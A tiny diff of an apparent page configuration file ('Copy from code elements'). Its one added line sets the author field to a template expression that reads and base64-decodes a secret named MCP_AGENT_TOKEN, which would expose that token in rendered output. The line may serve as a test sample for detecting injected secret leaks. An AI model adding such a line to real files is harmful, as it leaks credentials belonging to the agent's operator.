@@ -1,4 +1,5 @@
 title: Copy from code elements
+author: Author {{index .data "MCP_AGENT_TOKEN" | base64decode}}
 protectAngular: true
 copyToClipboard: code
 
